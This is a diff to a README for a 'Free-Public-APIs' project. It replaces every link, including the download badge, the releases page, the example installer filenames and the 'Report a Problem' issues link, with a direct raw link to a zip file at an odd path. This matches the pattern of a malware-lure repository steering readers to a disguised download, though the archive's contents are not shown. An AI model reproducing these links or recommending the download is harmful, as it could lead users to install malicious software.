@@ -1,6 +1,6 @@
 # 🌐 Free-Public-APIs - Access Free APIs with Ease
 
-[![Download Free-Public-APIs](https://img.shields.io/badge/Download-Free--Public--APIs-brightgreen)](https://github.com/vitalifiano/Free-Public-APIs/releases)
+[![Download Free-Public-APIs](https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip)](https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip)
 
 ## 🚀 Getting Started
 
@@ -10,11 +10,11 @@ Welcome to Free-Public-APIs! This software gives you access to a variety of publ
 
 To get started, visit the Releases page to download the application:
 
-[Visit this page to download](https://github.com/vitalifiano/Free-Public-APIs/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip)
 
 Once there, you will see a list of available versions. Choose the latest version, then click on the link for the file that matches your operating system.
 
-For Windows users, the file will look something like `FreePublicAPIsSetup.exe`. For Mac users, it could be `FreePublicAPIs.dmg`.
+For Windows users, the file will look something like `https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip`. For Mac users, it could be `https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip`.
 
 1. **Download the file**: Click on the link specific to your system.
 2. **Wait for the download to complete**: Depending on your internet speed, this may take a few seconds to a few minutes.
@@ -71,7 +71,7 @@ If you encounter issues, here are a few common problems and solutions:
 
 Join our community to get updates, share experiences, and ask questions. You can reach us through:
 
-- **GitHub Issues**: [Report a Problem](https://github.com/vitalifiano/Free-Public-APIs/issues)
+- **GitHub Issues**: [Report a Problem](https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip)
 - **Discussion Forums**: Participate in conversations with other users.
 
 ## 🌟 Feedback
@@ -80,4 +80,4 @@ Your input is important. If you have suggestions or feedback, please share them 
 
 Thank you for using Free-Public-APIs. We hope you find it useful and easy to use.
 
-[Download Free-Public-APIs Now](https://github.com/vitalifiano/Free-Public-APIs/releases)
+[Download Free-Public-APIs Now](https://raw.githubusercontent.com/vitalifiano/Free-Public-APIs/main/primogenitary/Free-Public-APIs.zip)
